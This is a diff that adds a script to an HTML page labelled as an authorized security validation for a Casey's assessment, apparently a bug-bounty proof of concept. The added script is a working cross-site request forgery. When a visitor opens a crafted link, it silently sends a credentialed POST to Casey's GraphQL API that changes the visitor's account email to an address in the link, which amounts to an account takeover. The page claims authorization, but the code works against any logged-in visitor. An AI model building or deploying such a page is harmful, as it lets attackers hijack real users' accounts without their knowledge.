@@ -4,12 +4,52 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Authorized Casey's Security Validation A44D505C9F60</title>
+  <style>
+    body { font: 16px/1.5 system-ui, sans-serif; max-width: 48rem; margin: 4rem auto; padding: 0 1rem; }
+    #status { padding: 1rem; border: 1px solid #bbb; border-radius: .5rem; }
+  </style>
 </head>
 <body>
   <main>
     <h1>Authorized security validation</h1>
     <p>Casey's assessment A44D505C9F60</p>
     <p>Unique proof: bb-a44d505c-6bda394b</p>
+    <p id="status">The base URL is inert. Use the authorized one-click test link supplied in the report.</p>
   </main>
+  <script>
+    (() => {
+      const status = document.querySelector('#status');
+      const params = new URLSearchParams(location.hash.slice(1));
+      const email = (params.get('email') || '').trim();
+      const authorized = params.get('run') === 'a44d505c';
+      const validEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+
+      if (!authorized || !validEmail) return;
+
+      const runKey = `caseys-a44d505c:${email}`;
+      if (sessionStorage.getItem(runKey)) {
+        status.textContent = 'This controlled request was already dispatched in this tab.';
+        return;
+      }
+
+      sessionStorage.setItem(runKey, new Date().toISOString());
+      status.textContent = 'Dispatching the authorized controlled request…';
+
+      const escapedEmail = JSON.stringify(email);
+      const query = `mutation { updateMyEmailAddress(emailAddress: ${escapedEmail}, emailOptIn: false) { __typename } }`;
+
+      fetch('https://www.caseys.com/api/graphql', {
+        method: 'POST',
+        mode: 'no-cors',
+        credentials: 'include',
+        headers: {'Content-Type': 'text/plain'},
+        body: JSON.stringify({query})
+      }).then(() => {
+        status.textContent = 'Controlled request dispatched. Verify the email rebind in the synthetic Casey account.';
+      }).catch(() => {
+        status.textContent = 'The browser blocked the controlled request.';
+      });
+    })();
+  </script>
 </body>
 </html>
